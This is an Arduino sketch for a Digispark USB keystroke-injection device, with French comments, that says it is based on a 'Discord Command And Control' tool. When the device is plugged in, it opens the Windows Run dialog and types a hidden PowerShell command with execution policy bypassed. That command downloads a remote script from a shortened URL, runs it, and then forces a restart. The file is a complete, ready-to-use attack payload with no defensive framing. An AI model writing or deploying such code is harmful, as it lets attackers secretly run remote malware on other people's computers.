[span_1](start_span)// Base: benzoXdev's Discord Command And Control[span_1](end_span)
// Modifié pour compatibilité universelle et redémarrage forcé

#include "DigiKeyboard.h"

void setup() {
}

void loop() {
  DigiKeyboard.delay(2000);
  DigiKeyboard.sendKeyStroke(0);

  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(1000);


  DigiKeyboard.print("powershell -NoP -Ep Bypass -W H -C \"irm https://is.gd/bwdcc2 | iex; shutdown -r -t 60\"");
  
  DigiKeyboard.sendKeyStroke(KEY_ENTER);

  for(;;){ /* Stop */ }
}
